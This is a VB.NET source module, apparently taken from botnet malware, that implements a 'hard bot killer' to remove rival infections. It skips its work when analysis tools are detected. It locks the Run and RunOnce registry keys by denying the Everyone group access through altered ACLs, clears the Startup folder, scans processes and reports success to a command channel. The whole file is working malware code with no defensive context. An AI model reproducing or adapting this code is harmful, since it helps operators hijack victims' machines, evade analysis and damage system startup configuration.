Imports System.Security.Principal
Imports Microsoft.Win32
Imports System.Security.AccessControl
'Coded by KFC Watermelon
'Takes out persistent bots like beta bot, no issue
Module HardBK
    Public Function HardBotKill()
        On Error Resume Next
        If Not AntisDetected = True Then
            RunStartupKiller()
                    KillKeys(Registry.CurrentUser.OpenSubKey("software\Microsoft\Windows\CurrentVersion\Run", True))
            KillKeys(Registry.CurrentUser.OpenSubKey("software\Microsoft\Windows\CurrentVersion\RunOnce", True))
                    KillFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                    If IsAdmin() Then
                        KillKeys(Registry.LocalMachine.OpenSubKey("software\Microsoft\Windows\CurrentVersion\Run", True))
                        KillKeys(Registry.LocalMachine.OpenSubKey("software\Microsoft\Windows\CurrentVersion\RunOnce", True))
                    End If
                    BotKillers.ScanProcess()
                    TalktoChannel("BK: Hard Bot Killer Ran Successfully!", String.Empty)
                End If
    End Function
    Function KillKeys(ByVal wat As RegistryKey)
        Try
            Dim securityIdentifier As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
            Dim ntacrcount As NTAccount = TryCast(securityIdentifier.Translate(GetType(NTAccount)), NTAccount)
            Dim s1 As String = ntacrcount.ToString
            Dim registrySecurity As New RegistrySecurity()
            registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.QueryValues Or RegistryRights.EnumerateSubKeys Or RegistryRights.Notify Or RegistryRights.ReadPermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny))
            registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.Delete Or RegistryRights.TakeOwnership Or RegistryRights.ChangePermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny))
            wat.SetAccessControl(registrySecurity)
            wat.Close()
        Catch : End Try
    End Function
End Module
